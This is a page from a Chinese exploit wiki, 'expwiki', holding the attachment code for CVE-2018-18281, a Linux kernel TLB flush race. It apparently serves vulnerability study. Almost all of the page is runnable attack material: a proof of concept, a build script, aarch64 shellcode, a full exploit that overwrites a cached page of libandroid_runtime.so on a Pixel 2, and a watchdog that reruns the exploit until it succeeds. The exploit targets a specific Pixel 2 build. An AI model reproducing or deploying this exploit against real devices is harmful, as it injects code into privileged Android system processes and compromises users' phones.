<!DOCTYPE html>
<!--[if IE 8]><html class="no-js lt-ie9" lang="en" > <![endif]-->
<!--[if gt IE 8]><!--> <html class="no-js" lang="en" > <!--<![endif]-->
<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  
  
  <link rel="shortcut icon" href="../../img/favicon.ico">
  <title>Cve 2018 18281 附件 - expwiki</title>
  <link href='https://fonts.googleapis.com/css?family=Lato:400,700|Roboto+Slab:400,700|Inconsolata:400,700' rel='stylesheet' type='text/css'>

  <link rel="stylesheet" href="../../css/theme.css" type="text/css" />
  <link rel="stylesheet" href="../../css/theme_extra.css" type="text/css" />
  <link rel="stylesheet" href="../../css/highlight.css">
  
  <script>
    // Current page data
    var mkdocs_page_name = "Cve 2018 18281 \u9644\u4ef6";
    var mkdocs_page_input_path = "kernel/cve-2018-18281-\u9644\u4ef6.md";
    var mkdocs_page_url = "/kernel/cve-2018-18281-\u9644\u4ef6/";
  </script>
  
  <script src="../../js/jquery-2.1.1.min.js"></script>
  <script src="../../js/modernizr-2.8.3.min.js"></script>
  <script type="text/javascript" src="../../js/highlight.pack.js"></script> 
  
</head>

<body class="wy-body-for-nav" role="document">

  <div class="wy-grid-for-nav">

    
    <nav data-toggle="wy-nav-shift" class="wy-nav-side stickynav">
      <div class="wy-side-nav-search">
        <a href="../.." class="icon icon-home"> expwiki</a>
        <div role="search">
  <form id ="rtd-search-form" class="wy-form" action="../../search.html" method="get">
    <input type="text" name="q" placeholder="Search docs" />
  </form>
</div>
      </div>

      <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="main navigation">
	<ul class="current">
	  
          
            <li class="toctree-l1">
		
    <a class="" href="../..">前言</a>
	    </li>
          
            <li class="toctree-l1">
		
    <span class="caption-text">linux用户态漏洞</span>
    <ul class="subnav">
                <li class="">
                    
    <a class="" href="../../userspace/cve-2018-1000001-分析/">Cve 2018 1000001 分析</a>
                </li>
                <li class="">
                    
    <a class="" href="../../userspace/cve-2018-1000001-附件/">Cve 2018 1000001 附件</a>
                </li>
                <li class="">
                    
    <a class="" href="../../userspace/cve-2019-12735-分析/">Cve 2019 12735 分析</a>
                </li>
                <li class="">
                    
    <a class="" href="../../userspace/cve-2019-12735-附件/">Cve 2019 12735 附件</a>
                </li>
                <li class="">
                    
    <a class="" href="../../userspace/cve-2019-5736-分析/">Cve 2019 5736 分析</a>
                </li>
                <li class="">
                    
    <a class="" href="../../userspace/cve-2019-5736-附件/">Cve 2019 5736 附件</a>
                </li>
    </ul>
	    </li>
          
            <li class="toctree-l1">
		
    <span class="caption-text">linux内核态漏洞</span>
    <ul class="subnav">
                <li class="">
                    
    <a class="" href="../cve-2018-18281-分析/">Cve 2018 18281 分析</a>
                </li>
                <li class=" current">
                    
    <a class="current" href="./">Cve 2018 18281 附件</a>
    <ul class="subnav">
            
    <li class="toctree-l3"><a href="#tlb-cve-2018-18281">TLB 缓存延迟刷新漏洞(cve-2018-18281)分析附件</a></li>
    
        <ul>
        
            <li><a class="toctree-l4" href="#poc">poc 源码</a></li>
        
            <li><a class="toctree-l4" href="#exp">exp 源码</a></li>
        
        </ul>
    

    </ul>
                </li>
                <li class="">
                    
    <a class="" href="../cve-2019-13272-分析/">Cve 2019 13272 分析</a>
                </li>
                <li class="">
                    
    <a class="" href="../cve-2019-13272-附件/">Cve 2019 13272 附件</a>
                </li>
    </ul>
	    </li>
          
            <li class="toctree-l1">
		
    <a class="" href="../../acknowledgements/">致谢</a>
	    </li>
          
        </ul>
      </div>
      &nbsp;
    </nav>

    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">

      
      <nav class="wy-nav-top" role="navigation" aria-label="top navigation">
        <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
        <a href="../..">expwiki</a>
      </nav>

      
      <div class="wy-nav-content">
        <div class="rst-content">
          <div role="navigation" aria-label="breadcrumbs navigation">
  <ul class="wy-breadcrumbs">
    <li><a href="../..">Docs</a> &raquo;</li>
    
      
        
          <li>linux内核态漏洞 &raquo;</li>
        
      
    
    <li>Cve 2018 18281 附件</li>
    <li class="wy-breadcrumbs-aside">
      
    </li>
  </ul>
  <hr/>
</div>
          <div role="main">
            <div class="section">
              
                <h1 id="tlb-cve-2018-18281">TLB 缓存延迟刷新漏洞(cve-2018-18281)分析附件</h1>
<h2 id="poc">poc 源码</h2>
<pre><code class="c">#define _GNU_SOURCE

//I test the poc in pixel2 with fingerprint: google/walleye/walleye:9/PQ1A.181105.017.A1/5081125:user/release-keys

#include &lt;pthread.h&gt;
#include &lt;stdio.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;err.h&gt;
#include &lt;unistd.h&gt;
#include &lt;string.h&gt;
#include &lt;sys/mman.h&gt;
#include &lt;sys/prctl.h&gt;
#include &lt;sched.h&gt;
#include &lt;errno.h&gt;
#include &lt;sys/syscall.h&gt;

#define ul unsigned long

static int alloc_fd = -1;
int g_worker_tid;
int worker_launch_pipe[2];
int spinner_cont_pipe[2];

#define allocptr ((void*)0x1000000000UL)
#define allocptr2 ((void*)0x2000000000UL)
#define TLB_USAGE 200
#define AREA_SIZE   0x20000000
#define CORE_0  3
#define CORE_1 4
#define CORE_2 5 
#define CORE_3 6 

void pin_task_to(int pid, int cpu) {
  cpu_set_t cset;
  CPU_ZERO(&amp;cset);
  CPU_SET(cpu, &amp;cset);
  if (sched_setaffinity(pid, sizeof(cpu_set_t), &amp;cset))
    err(1, &quot;affinity&quot;);
}
void pin_to(int cpu) { pin_task_to(0, cpu); }

unsigned long get_pt_size(int status_fd) {
  char buf[0x1000 + 1];
  ssize_t res = pread(status_fd, buf, 0x1000, 0);
  if (res &lt;= 0)
    err(1, &quot;status read&quot;);
  buf[res] = 0;
  char *p = strstr(buf, &quot;VmPTE:&quot;);
  if (!p) errx(1, &quot;bad status&quot;);
  p +=  6;
  while (*p == '\t' || *p == ' ') p++;
  return strtoul(p, NULL, 10);
}

void tell_succ() {
  int fd = open(&quot;/data/local/tmp/succ&quot;, O_CREAT|O_RDWR);
  write(fd, &quot;stage 1 ok&quot;, 16);
  close(fd);
}

void *nicer_spinner(void *dummy) {
  pin_to(CORE_0);
  while (1);
}

void *reader_fn(void *dummy) {
  pin_to(CORE_3);
  while (1) {
   for (int i=0; i&lt;TLB_USAGE; i++) {
    ul x = *(ul *)(allocptr + 0x1000UL * i);
    if (x != 0x4141414141414141UL) {
      printf(&quot;GOT 0x%016lx\n&quot;, x);
      tell_succ();
    }
  }
  }
}

void *truncate_fn(void *dummy) {
  pin_to(CORE_1);

  if (write(worker_launch_pipe[1], &quot;X&quot;, 1) != 1)
    errx(1, &quot;write wlp&quot;);

  char scpc;
  if (read(spinner_cont_pipe[0], &amp;scpc, 1) != 1)
    errx(1, &quot;read scp&quot;);

  pin_task_to(g_worker_tid, CORE_0);
     //if (ftruncate(alloc_fd, 0)) err(1, &quot;ftruncate&quot;);
     if (fallocate(alloc_fd, FALLOC_FL_PUNCH_HOLE|FALLOC_FL_KEEP_SIZE, 0, TLB_USAGE*0x1000)) err(1, &quot;fallocate&quot;);

    while (1) pause();

}

void *idle_worker(void *dummy) {
  g_worker_tid = syscall(__NR_gettid);

  if (write(worker_launch_pipe[1], &quot;X&quot;, 1) != 1)
    errx(1, &quot;write wlp&quot;);

  struct sched_param param = {
    .sched_priority = 0
  };
  if (sched_setscheduler(0, SCHED_IDLE, &amp;param))
    err(1, &quot;sched_setscheduler&quot;);

  sleep(2); 

  if (mremap(allocptr, AREA_SIZE, AREA_SIZE, MREMAP_FIXED|MREMAP_MAYMOVE, allocptr2) != allocptr2) err(1, &quot;mremap&quot;);

  while (1) pause();
}

int main(void) {
  setbuf(stdout, NULL);

  printf(&quot;try triggerring..\n&quot;);

  pin_to(CORE_1);

  if (pipe(worker_launch_pipe) || pipe(spinner_cont_pipe))
    err(1, &quot;pipe&quot;);

  alloc_fd = syscall(__NR_memfd_create, &quot;truncate-me&quot;, 0);
  if (alloc_fd == -1) err(1, &quot;create&quot;);
  if (ftruncate(alloc_fd, AREA_SIZE)) err(1, &quot;trunc init&quot;);
  if (mmap(allocptr, AREA_SIZE, PROT_READ|PROT_WRITE, MAP_SHARED, alloc_fd, 0) != allocptr)
    err(1, &quot;mmap 1&quot;);
  if (madvise(allocptr, AREA_SIZE, MADV_NOHUGEPAGE) &amp;&amp; errno != EINVAL)
    err(1, &quot;advice&quot;);
  memset(allocptr, 0x41, AREA_SIZE);

  pthread_t thread;
  if (pthread_create(&amp;thread, NULL, idle_worker, NULL)) err(1, &quot;idler&quot;);
  if (pthread_create(&amp;thread, NULL, truncate_fn, NULL)) err(1, &quot;truncater&quot;);
  if (pthread_create(&amp;thread, NULL, nicer_spinner, NULL)) err(1, &quot;pthread_create&quot;);
  if (pthread_create(&amp;thread, NULL, reader_fn, NULL)) errx(1, &quot;reader&quot;);

  pin_to(CORE_2);

  char wlpc;
  if (read(worker_launch_pipe[0], &amp;wlpc, 1) != 1 || read(worker_launch_pipe[0], &amp;wlpc, 1) != 1)
    errx(1, &quot;read wlp&quot;);

  int status_fd = open(&quot;/proc/self/status&quot;, O_RDONLY);
  if (status_fd == -1)
    err(1, &quot;open status&quot;);

  unsigned long orig = get_pt_size(status_fd);
  int bumped = 0;
  while (1) {
    unsigned long nsize = get_pt_size(status_fd);
    if (nsize != orig) {
      if (!bumped) {
        if (write(spinner_cont_pipe[1], &quot;x&quot;, 1) != 1)
          errx(1, &quot;spinner_cont_pipe&quot;);

        bumped = 1;
      }

      orig = nsize;
    }
  }

  pause();

  return 0;
}
</code></pre>

<h2 id="exp">exp 源码</h2>
<h3 id="compilesh">compile.sh</h3>
<pre><code class="shell">
!/bin/sh

# This should be a C compiler from an android &quot;standalone toolchain&quot; as
# documented at &lt;https://developer.android.com/ndk/guides/standalone_toolchain&gt;.
# Statically linking against glibc doesn't work here because for multithreaded
# code, glibc tries to use set_robust_list, which immediately causes the program
# to be killed by seccomp.
#CC=$HOME/android-sdk/sa-tch/bin/clang
CC=/data3/aosp/prebuilts/clang/host/linux-x86/clang-4579689/bin/clang

# Prepare shellcode - this can use any aarch64 toolchain.
# NOTE: We are changing the page-relative alignment of the shellcode, so normal
# aarch64 RIP-relative addressing doesn't work.
aarch64-linux-gnu-as arm_shellcode.s -o arm_shellcode.o  # 将汇编文件 arm_shellcode.s 汇编成 .o 文件
aarch64-linux-gnu-ld arm_shellcode.o -o arm_shellcode # 将 .o 链接成可执行 elf 文件
aarch64-linux-gnu-objcopy --dump-section .text=arm_shellcode.bin arm_shellcode # 将可执行文件的代码段 .text 提取到文件 arm_shellcode.bin 
xxd -i arm_shellcode.bin &gt; arm_shellcode.h # 将二进制文件放进一个c 语言分格的数组变量，后续在c代码里以数组操作它
rm arm_shellcode.o arm_shellcode arm_shellcode.bin
# need android-ndk-r18b to build
make

</code></pre>

<h3 id="arm_shellcodes">arm_shellcode.s</h3>
<pre><code class="c">.global _start

// signature
file_start:
brk #0
brk #0

// open file
_start:
mov x0, #-100
adrp x1, _start
// NOTE: We are changing the page-relative alignment of the shellcode, so normal
// aarch64 RIP-relative addressing doesn't work.
add x1, x1, attr_path-file_start
mov x2, #0
mov x8, #0x38
svc #0

// read from file
sub sp, sp, #128
mov x1, sp
mov x2, #128
mov x8, #0x3f
svc #0

// shove file contents into hostname
mov x1, x0
mov x0, sp
mov x8, #0xa1
svc #0

// spin
spin_label:
b spin_label

attr_path:
.ascii &quot;/proc/self/attr/current\0&quot;

rept_start:
.rept (0x1000 - (rept_start - file_start)) / 4
b _start
.endr
</code></pre>

<h3 id="expc">exp.c</h3>
<pre><code class="c">// for Pixel 2, build google/walleye/walleye:9/PQ1A.181105.017.A1/5081125:user/release-keys
// 20190304, chengjia4574@gmail.com
// code is from Jann Horn

#define _GNU_SOURCE
#include &lt;stdlib.h&gt;
#include &lt;sys/syscall.h&gt;
#include &lt;pthread.h&gt;
#include &lt;sched.h&gt;
#include &lt;err.h&gt;
#include &lt;stdbool.h&gt;
#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;
#include &lt;sys/mman.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;string.h&gt;
#include &lt;sys/time.h&gt;
#include &lt;errno.h&gt;
#include &lt;sys/prctl.h&gt;
#include &lt;signal.h&gt;


#include &quot;arm_shellcode.h&quot;

#define RAM_SIZE (3744240UL*1024UL)
#define SPAM_SIZE (RAM_SIZE * 2)

#define VICTIM_FILE &quot;/system/lib64/libandroid_runtime.so&quot;
#define VICTIM_SIZE   0x21cef0
#define VICTIM_OFFSET 0x157000
#define EXPECTED_CODE 0xeb08005f91007108UL

#define CORE_TARPIT  3
#define CORE_MUNMAP  4
#define CORE_CLOBBER 5
#define CORE_PREEMPT 6

#define TLB_USAGE 200

#define ADDR1 ((void*)0x1000000000UL)
#define ADDR2 ((void*)0x2000000000UL)

#define AREA_SIZE   0x20000000

int file_fd = -1;
int victim_file_fd = -1;
int worker_launch_pipe[2];
int spinner_cont_pipe[2];
volatile int worker_tid = -1;
volatile int spinner_verbose = 0;
volatile int spinner_tid = -1;
volatile int spinner_state = 0;
volatile int worker_seen_spinner = 0;
volatile int swap_count;
volatile unsigned long seen_values[1000];
volatile int seen_values_ctr = 0;
volatile int slot_log = -1;

bool check_in_core(void *ptr) {
  unsigned char c;
  if (mincore(ptr, 0x1000, &amp;c)) err(1, &quot;mincore&quot;);
  return c &amp; 1;
}

void pin_task_to(int pid, int cpu) {
  cpu_set_t cset;
  CPU_ZERO(&amp;cset);
  CPU_SET(cpu, &amp;cset);
  if (sched_setaffinity(pid, sizeof(cpu_set_t), &amp;cset))
    err(1, &quot;affinity&quot;);
}
void pin_to(int cpu) { pin_task_to(0, cpu); }

unsigned long get_us() {
  struct timeval tv;
  if (gettimeofday(&amp;tv, NULL))
    err(1, &quot;gettimeofday&quot;);
  return ((unsigned long)tv.tv_sec)*1000000UL + (unsigned long)tv.tv_usec;
}

unsigned long get_pt_size(int status_fd) {
  char buf[0x1000 + 1];
  ssize_t res = pread(status_fd, buf, 0x1000, 0);
  if (res &lt;= 0)
    err(1, &quot;status read&quot;);
  buf[res] = 0;
  char *p = strstr(buf, &quot;VmPTE:&quot;);
  if (!p) errx(1, &quot;bad status&quot;);
  p +=  6;
  while (*p == '\t' || *p == ' ') p++;
  return strtoul(p, NULL, 10);
}

void *idle_worker(void *dummy) {
  worker_tid = syscall(__NR_gettid);
  if (write(worker_launch_pipe[1], &quot;X&quot;, 1) != 1)
    errx(1, &quot;write wlp&quot;);

  struct sched_param param = {
    .sched_priority = 0
  };
  if (sched_setscheduler(0, SCHED_IDLE, &amp;param))
    err(1, &quot;sched_setscheduler&quot;);

  sleep(2);

  if (mremap(ADDR1, AREA_SIZE, AREA_SIZE, MREMAP_FIXED|MREMAP_MAYMOVE, ADDR2) != ADDR2)
    err(1, &quot;mremap&quot;);

  while (1) pause();
}

void *nicer_spinner(void *dummy) {
  pin_to(CORE_TARPIT);
  while (1);
}

void *spinner(void *dummy) {
  bool trunc_seen = false;
  spinner_tid = syscall(__NR_gettid);
  if (write(worker_launch_pipe[1], &quot;X&quot;, 1) != 1)
    errx(1, &quot;write wlp&quot;);

  int wss_shown = 0;

  char scpc;
  if (read(spinner_cont_pipe[0], &amp;scpc, 1) != 1)
    errx(1, &quot;read scp&quot;);

  while (1) {
    int wss = worker_seen_spinner;
    if (wss != wss_shown) {
      wss_shown = wss;
      printf(&quot;worker has seen %d\n&quot;, wss);
    }
    if (spinner_verbose) {
      if (!trunc_seen) {
        spinner_state++;
        pin_task_to(worker_tid, CORE_TARPIT);
        if (fallocate(file_fd, FALLOC_FL_PUNCH_HOLE|FALLOC_FL_KEEP_SIZE, 0, TLB_USAGE*0x1000)) err(1, &quot;fallocate&quot;);
        char dummy_buf[1];
        if (pread(victim_file_fd, dummy_buf, 1, VICTIM_OFFSET) != 1) err(1, &quot;pread&quot;);

        void *pin_map = mmap(NULL, 0x1000, PROT_READ, MAP_SHARED|MAP_LOCKED, victim_file_fd, VICTIM_OFFSET);
        if (pin_map == MAP_FAILED) {
          err(1, &quot;pin_map&quot;);
        }

        while (1) /*spin*/;
      }
      spinner_verbose = 0;
      spinner_state++;
      printf(&quot;spinnnnner\n&quot;);
    }
  }
}

void tell_succ() {
  int fd = open(&quot;/data/local/tmp/succ&quot;, O_CREAT);
  write(fd, &quot;stage 1 ok&quot;, 16);
  close(fd);
}


void segv_handler(int dummy) {
  write(1, &quot;TLB flush received\n&quot;, 19);

  // yes, yes, stdio in signal handler. it's fine. we don't (intentionally)
  // crash inside libc.
  if (swap_count != 0) {
    printf(&quot;***** SWAP COUNT: %d\n&quot;, swap_count);
  }
  if (slot_log != -1) {
    printf(&quot;  ### SWAP AT SLOT: %d\n&quot;, slot_log);
  }
  for (int i=0; i&lt;seen_values_ctr; i++) {
    if (seen_values[i] != 0xccccccccccccccccUL) {
      printf(&quot;  *** SEEN: 0x%016lx\n&quot;, seen_values[i]);
    }
  }

  void *pin_map = mmap(NULL, 0x1000, PROT_READ, MAP_SHARED|MAP_LOCKED, victim_file_fd, VICTIM_OFFSET);
  if (pin_map == MAP_FAILED) {
    err(1, &quot;FAIL0&quot;);
    exit(0);
  }
  unsigned long num = *(volatile long *)pin_map;
  char hex[17];
  for (int i=0; i&lt;16; i++) {
    int nibble = (num &gt;&gt; ((15-i) * 4)) &amp; 0xf;
    hex[i] = (nibble &lt; 10) ? ('0' + nibble) : ('a' + (nibble - 10));
  }
  hex[16] = '\0';
  printf(&quot;target file page starts with: %s\n&quot;, hex);
  if (num == 0xd4200000d4200000UL) {
    unsigned int equal_bytes = 0;
    while (equal_bytes &lt; 0x1000) {
      if (((unsigned char*)pin_map)[equal_bytes] != arm_shellcode_bin[equal_bytes]) break;
      equal_bytes++;
    }
    if (equal_bytes == 0x1000) {
      printf(&quot;STAGE 1 OK\n&quot;);
      tell_succ();
      //while (1) pause();
    } else {
      printf(&quot;ERROR: stage 1 diverges @0x%x, retry\n&quot;, equal_bytes);
    }
  }
  sleep(1);
  exit(0);
}

void *read_worker(void *dummy) {
  pin_to(CORE_CLOBBER);

  bool pin_to_slot = false;
  while (1) { for (int i=0; i&lt;TLB_USAGE; i++) {
retry_swap:;
    unsigned long expected = EXPECTED_CODE;
    unsigned long *addr = (unsigned long *)(ADDR1 + 0x1000UL * i);
    bool swapped = __atomic_compare_exchange_n(
      addr,
      &amp;expected,
      0x1337133713371337UL,
      false, __ATOMIC_RELAXED, __ATOMIC_RELAXED
    );
    if (swapped) {
      pin_to_slot = true;
      swap_count++;
      slot_log = i;
      while (1) {
        memcpy(addr, arm_shellcode_bin, sizeof(arm_shellcode_bin));
      }
    } else {
      *(volatile char *)arm_shellcode_bin;
      *(volatile char *)(arm_shellcode_bin+0xfff);
      for (int i=0; i&lt;seen_values_ctr; i++) {
        if (seen_values[i] == expected) goto end_swapfail;
      }
      if (seen_values_ctr &lt; 1000) {
        seen_values[seen_values_ctr++] = expected;
      }
end_swapfail:;
    }
  } }
}

int kickout_victim_page(void) {
  unsigned long off;
  setbuf(stdout, NULL);

  int fd = open(VICTIM_FILE, O_RDONLY);
  if (fd == -1) err(1, &quot;open&quot;);
  char *victim_map = mmap(NULL, VICTIM_SIZE, PROT_READ, MAP_SHARED, fd, 0);
  if (victim_map == MAP_FAILED) err(1, &quot;mmap&quot;);
  if (madvise(victim_map, VICTIM_SIZE, MADV_RANDOM)) err(1, &quot;madv random&quot;);
  void *victim_page = victim_map + VICTIM_OFFSET;
  printf(&quot;in core initially: %d\n&quot;, (int)check_in_core(victim_page));

  int spam_fd = open(&quot;spam_file&quot;, O_RDWR|O_CREAT|O_TRUNC, 0666);
  if (fallocate(spam_fd, 0, 0, SPAM_SIZE)) err(1, &quot;fallocate&quot;);

  // https://arxiv.org/pdf/1710.00551.pdf (&quot;Another Flip in the Wall of
  // Rowhammer Defenses&quot;), section VIII-B says:
  // &quot;A fundamental observation we made is that the replacement algorithm of the
  //  Linux page cache prioritizes eviction of nonexecutable pages over
  //  executable pages.&quot;
  // In shrink_active_list() and page_check_references() in mm/vmscan.c, you can
  // see that file-backed executable pages get special handling.
  char *spam_map = mmap(NULL, SPAM_SIZE, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_SHARED, spam_fd, 0);
  if (spam_map == MAP_FAILED) err(1, &quot;mmap spam&quot;);

restart:
  printf(&quot;starting\n&quot;);
  unsigned long ts = get_us();
  while (1) {
    for (off = 0; off &lt; SPAM_SIZE; off += 0x1000UL) {

      unsigned long cts = get_us();
      if (cts &gt; ts + 300000) {
        if (!check_in_core(victim_page)) goto read_around;
        ts = cts;
      }

      *(volatile unsigned long *)(spam_map + off);
    }
    bool ic = check_in_core(victim_page);
    printf(&quot;in core (spamming): %d\n&quot;, (int)ic);
    if (!ic) break;
  }
read_around:
  printf(&quot;starting read-around\n&quot;);
  for (off = 0; off &lt; VICTIM_SIZE; off += 0x1000) {
    if (off == VICTIM_OFFSET) continue;
    //printf(&quot;RA at 0x%lx\n&quot;, off);
    bool ic = check_in_core(victim_page);
    if (ic) {
      printf(&quot;!!! back in core\n&quot;);
      goto restart;
    }
    *(volatile char *)(victim_map + off);
  }
  printf(&quot;stopping\n&quot;);

  return 0;
}

int trigger(void) {
  setbuf(stdout, NULL);

  signal(SIGSEGV, segv_handler);

  victim_file_fd = open(VICTIM_FILE, O_RDONLY);
  if (victim_file_fd == -1) err(1, &quot;unable to open victim file&quot;);
  if (posix_fadvise(victim_file_fd, 0, 0, POSIX_FADV_RANDOM)) err(1, &quot;posix_fadvise&quot;);

  pin_to(CORE_MUNMAP);

  if (pipe(worker_launch_pipe) || pipe(spinner_cont_pipe))
    err(1, &quot;pipe&quot;);

  file_fd = syscall(__NR_memfd_create, &quot;truncate-me&quot;, 0);
  if (file_fd == -1) err(1, &quot;create&quot;);
  if (ftruncate(file_fd, AREA_SIZE)) err(1, &quot;trunc init&quot;);
  if (mmap(ADDR1, AREA_SIZE, PROT_READ|PROT_WRITE, MAP_SHARED, file_fd, 0) != ADDR1)
    err(1, &quot;mmap 1&quot;);
  if (madvise(ADDR1, AREA_SIZE, MADV_NOHUGEPAGE) &amp;&amp; errno != EINVAL)
    err(1, &quot;advice&quot;);
  memset(ADDR1, 0xcc, AREA_SIZE);

  pthread_t thread;
  if (pthread_create(&amp;thread, NULL, idle_worker, NULL))
    err(1, &quot;pthread_create&quot;);
  if (pthread_create(&amp;thread, NULL, spinner, NULL))
    err(1, &quot;pthread_create&quot;);
  if (pthread_create(&amp;thread, NULL, nicer_spinner, NULL))
    err(1, &quot;pthread_create&quot;);
  if (pthread_create(&amp;thread, NULL, read_worker, NULL))
    err(1, &quot;pthread_create&quot;);

  pin_to(CORE_PREEMPT);

  char wlpc;
  if (read(worker_launch_pipe[0], &amp;wlpc, 1) != 1 || read(worker_launch_pipe[0], &amp;wlpc, 1) != 1)
    errx(1, &quot;read wlp&quot;);

  sleep(1);

  int status_fd = open(&quot;/proc/self/status&quot;, O_RDONLY);
  if (status_fd == -1)
    err(1, &quot;open status&quot;);

  unsigned long orig = get_pt_size(status_fd);
  int bumped = 0;
  while (1) {
    unsigned long nsize = get_pt_size(status_fd);
    if (nsize != orig) {
      spinner_verbose = 1;
      if (!bumped) {
        if (write(spinner_cont_pipe[1], &quot;x&quot;, 1) != 1)
          errx(1, &quot;spinner_cont_pipe&quot;);

        bumped = 1;
      }

      orig = nsize;
    }
  }

  pause();
}

int main(int argc, char** argv)
{
    kickout_victim_page();
    trigger();
}
</code></pre>

<h3 id="watchdogc">watchdog.c</h3>
<pre><code class="c">// for Pixel 2, build google/walleye/walleye:9/PQ1A.181105.017.A1/5081125:user/release-keys
// 20190304, chengjia4574@gmail.com
// code is from Jann Horn

#define _GNU_SOURCE
#include &lt;stdlib.h&gt;
#include &lt;sys/syscall.h&gt;
#include &lt;pthread.h&gt;
#include &lt;sched.h&gt;
#include &lt;err.h&gt;
#include &lt;stdbool.h&gt;
#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;
#include &lt;sys/mman.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;string.h&gt;
#include &lt;sys/time.h&gt;
#include &lt;errno.h&gt;
#include &lt;sys/prctl.h&gt;
#include &lt;signal.h&gt;

void gethost(){
    char host[64];
    int ret = -1;
    ret = gethostname(host, 64);
    if(!ret)
        printf(&quot;read hostname : %s\n&quot;, host);
}

void sethost(){
    char *h = &quot;jiayy-hostname&quot;;
    int ret = -1;
    ret = syscall(__NR_sethostname, h, strlen(h));
    if(!ret)
        printf(&quot;success \n&quot;);
    else
        perror(&quot;errno \n&quot;);

}


void signal_handler(int signo) {
    if (signo == SIGCHLD) {
        pid_t pid;
        while ((pid = waitpid(-1, NULL, WNOHANG)) &gt; 0) {
            printf(&quot;SIGCHLD pid %d\n&quot;, pid);
        }
    }
}

void runexp() {
        pid_t pid;
    const char*  envs[] = {&quot;LD_LIBRARY_PATH=/vendor/lib64:/system/lib64&quot;,&quot;PATH=/sbin:/vendor/bin:/system/sbin:/system/bin:/system/xbin&quot;,NULL};
    const char*  args[] = {&quot;/system/bin/sh&quot;,&quot;-c&quot;,&quot;/data/local/tmp/exp&quot;, NULL};

        if((pid = fork()) &lt; 0)
                return;
    else if(pid == 0)
        execve(&quot;/system/bin/sh&quot;, (char**)args, (char**)envs);

    wait(pid);
}

void waitupanyapp() {
        pid_t pid;
    const char*  envs[] = {&quot;LD_LIBRARY_PATH=/vendor/lib64:/system/lib64&quot;,&quot;PATH=/sbin:/vendor/bin:/system/sbin:/system/bin:/system/xbin&quot;,NULL};
    const char*  args[] = {&quot;/system/bin/am&quot;,&quot;start&quot;,&quot;-n&quot;,&quot;com.android.chrome/com.google.android.apps.chrome.Main&quot;, NULL};

        if((pid = fork()) &lt; 0)
                return;
    else if(pid == 0)
        execve(&quot;/system/bin/am&quot;, (char**)args, (char**)envs);

    wait(pid);
}


int main(int argc, char** argv)
{
    gethost();
    if(access(&quot;/data/local/tmp/exp&quot;,F_OK) != 0) {
        printf(&quot;/data/local/tmp/exp not exist!\n&quot;);
        exit(0);
    }
    if(access(&quot;/data/local/tmp/succ&quot;,F_OK) == 0) {
        unlink(&quot;/data/local/tmp/succ&quot;);
    }

    while(1) {
        runexp();
        if(access(&quot;/data/local/tmp/succ&quot;,F_OK) == 0) {
            break;
        }
    }
    printf(&quot;STAGE 2, you need to open an app to trigger shellcode(any app is ok), then you can run hostname to see if it prints u:r:zygote:s0\n&quot;); 
    getchar();
    gethost();
}
</code></pre>
              
            </div>
          </div>
          <footer>
  
    <div class="rst-footer-buttons" role="navigation" aria-label="footer navigation">
      
        <a href="../cve-2019-13272-分析/" class="btn btn-neutral float-right" title="Cve 2019 13272 分析">Next <span class="icon icon-circle-arrow-right"></span></a>
      
      
        <a href="../cve-2018-18281-分析/" class="btn btn-neutral" title="Cve 2018 18281 分析"><span class="icon icon-circle-arrow-left"></span> Previous</a>
      
    </div>
  

  <hr/>

  <div role="contentinfo">
    <!-- Copyright etc -->
    
  </div>

  Built with <a href="http://www.mkdocs.org">MkDocs</a> using a <a href="https://github.com/snide/sphinx_rtd_theme">theme</a> provided by <a href="https://readthedocs.org">Read the Docs</a>.
</footer>
	  
        </div>
      </div>

    </section>
    
  </div>

  <div class="rst-versions" role="note" style="cursor: pointer">
    <span class="rst-current-version" data-toggle="rst-current-version">
      
      
        <span><a href="../cve-2018-18281-分析/" style="color: #fcfcfc;">&laquo; Previous</a></span>
      
      
        <span style="margin-left: 15px"><a href="../cve-2019-13272-分析/" style="color: #fcfcfc">Next &raquo;</a></span>
      
    </span>
</div>
    <script src="../../js/theme.js"></script>

</body>
</html>
